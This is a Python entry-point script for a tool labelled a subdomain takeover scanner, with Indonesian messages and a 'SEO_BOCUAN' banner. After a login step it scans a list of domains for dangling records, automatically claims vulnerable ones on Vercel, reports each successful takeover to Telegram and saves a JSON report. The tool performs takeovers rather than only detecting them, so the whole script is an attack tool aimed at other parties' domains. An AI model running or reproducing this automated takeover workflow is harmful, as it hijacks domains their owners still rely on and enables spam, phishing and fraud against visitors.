import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

import getpass
import time
import argparse
import json
from auth.auth_manager import setup_db, login_user
from scanner.analyzer import scan_domains
from claimers.vercel_claimer import VercelClaimer
from notifications.telegram_notifier import send_success_notification

def generate_json_report(results, filename):
    """Menyimpan hasil scan ke dalam file JSON."""
    try:
        with open(filename, 'w') as f:
            json.dump(results, f, indent=4)
        print(f"[*] Laporan hasil operasi berhasil disimpan ke {filename}")
    except Exception as e:
        print(f"[!] Gagal menyimpan laporan: {e}")

def main():
    setup_db()


    banner = """
███████╗ ██████╗ ██████╗ ██████╗ ██╗██████╗ ██████╗ ███████╗███╗   ██╗   ██╗  ██╗ ██████╗ ██████╗ 
██╔════╝██╔═══██╗██╔══██╗██╔══██╗██║██╔══██╗██╔══██╗██╔════╝████╗  ██║   ██║  ██║██╔═████╗╚════██╗
█████╗  ██║   ██║██████╔╝██████╔╝██║██║  ██║██║  ██║█████╗  ██╔██╗ ██║   ███████║██║██╔██║ █████╔╝
██╔══╝  ██║   ██║██╔══██╗██╔══██╗██║██║  ██║██║  ██║██╔══╝  ██║╚██╗██║   ╚════██║████╔╝██║ ╚═══██╗
██║     ╚██████╔╝██║  ██║██████╔╝██║██████╔╝██████╔╝███████╗██║ ╚████║███████╗██║╚██████╔╝██████╔╝
╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝ ╚═════╝ ╚═════╝ 
    
                [v3.1 - Forbidden_403 x SEO_BOCUAN]
    """
    print(banner)


    print("--- Autentikasi Diperlukan ---")
    username = input("Username: ")
    password = getpass.getpass("Password: ")

    is_logged_in, telegram_chat_id = login_user(username, password)

    if not is_logged_in:
        print("Login gagal! Program keluar.")
        return

    print(f"\n✅ Login berhasil! Selamat bekerja, {username}.")
    if not telegram_chat_id:
        print("[!] Peringatan: Chat ID Telegram tidak ditemukan untuk user ini. Notifikasi tidak akan dikirim.")
    

    parser = argparse.ArgumentParser(description="Danguard v3.1 - Subdomain Takeover Scanner")
    parser.add_argument(
        'input_file', 
        nargs='?', 
        default='domains.txt',
        help="File yang berisi daftar domain untuk discan. Default: domains.txt"
    )
    args = parser.parse_args()

    if not os.path.exists(args.input_file):
        print(f"[!] Error: File '{args.input_file}' tidak ditemukan.")
        print("[!] Silakan buat file tersebut atau berikan nama file yang benar.")
        return

    print(f"[*] Membaca daftar domain dari file: {args.input_file}")


    dangling_domains = scan_domains(args.input_file)
    
    if not dangling_domains:
        print("[!] Tidak ada domain yang rentan ditemukan atau file kosong. Program selesai.")
        return


    vercel_claimer = VercelClaimer()

    results = []
    
    print("\n--- MEMULAI PROSES TAKEOVER ---")
    
    for domain_info in dangling_domains:
        print(f"\n--- Memeriksa {domain_info['original_domain']} ---")
        
        claimer = None
        if domain_info['service'] == 'vercel':
            claimer = vercel_claimer

        else:
            print(f"[!] Layanan '{domain_info['service']}' belum didukung atau claimer belum diaktifkan.")
            continue

        result = claimer.claim(target_name=domain_info['target'], **domain_info)
        result['original_domain'] = domain_info['original_domain']
        results.append(result)
        
        print(f"[#] Hasil: {result['status']} - {result.get('reason', '')}")
        
        if result['status'] == 'SUCCESS':
            print(f"[🎉] BERHASIL! Domain {domain_info['original_domain']} telah di-takeover!")
            if telegram_chat_id:
                send_success_notification(telegram_chat_id, domain_info)
        
        print("[*] Menunggu 2 detik sebelum ke target berikutnya...")
        time.sleep(2)

    print("\n--- Proses Selesai ---")
    
    report_filename = f"takeover_report_{args.input_file.replace('.txt', '')}.json"
    generate_json_report(results, report_filename)

if __name__ == "__main__":
    main()
